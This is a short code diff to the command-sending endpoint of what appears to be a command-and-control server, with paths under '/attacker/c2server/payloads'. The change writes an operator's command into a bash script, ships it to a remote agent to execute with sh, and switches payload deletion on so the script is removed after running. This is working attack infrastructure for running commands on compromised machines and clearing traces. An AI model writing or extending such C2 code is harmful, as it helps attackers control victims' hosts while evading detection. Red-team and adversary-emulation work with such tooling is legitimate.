@@ -108,15 +108,22 @@ def send_command():
         if agent not in agents:
             return jsonify({"error": "Agent not found"}), 404
 
+        executor_script_content = f"#!/bin/bash\n{command}\n"
+        executor_script_path = f"/attacker/c2server/payloads/exec_script.sh"
+        with open(executor_script_path, "w") as temp_script:
+            temp_script.write(executor_script_content)
+
+        payloads.append("exec_script.sh")
+
         command_id = str(uuid.uuid4())
         instruction = Instruction(
             id=command_id,
-            command=encode_base64(command),
+            command=encode_base64("./exec_script.sh"),
             executor="sh",
             timeout=60,
             payloads=payloads,
             uploads=[],
-            delete_payload=False,
+            delete_payload=True,
         )
         command = Command(
             id=command_id,
